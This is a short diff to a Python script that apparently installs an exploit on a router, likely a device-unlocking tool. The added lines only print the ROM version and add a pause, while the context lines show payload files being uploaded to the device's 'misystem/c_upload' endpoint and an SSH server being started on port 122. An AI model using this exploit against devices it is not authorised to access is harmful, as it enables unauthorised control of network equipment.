@@ -38,6 +38,7 @@ if gw.status < 1:
 
 dname = gw.device_name
 print("device_name =", gw.device_name)
+print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
 
 if gw.ping(verbose = 0) is True:
   die(0, "Exploit already installed and running")
@@ -161,6 +162,8 @@ if (fn_payload2):
   requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload2, 'rb')})
 if (fn_payload3):
   requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})
+
+time.sleep(1)
 
 if gw.use_ssh:
   print("Running SSH server on port 122...")
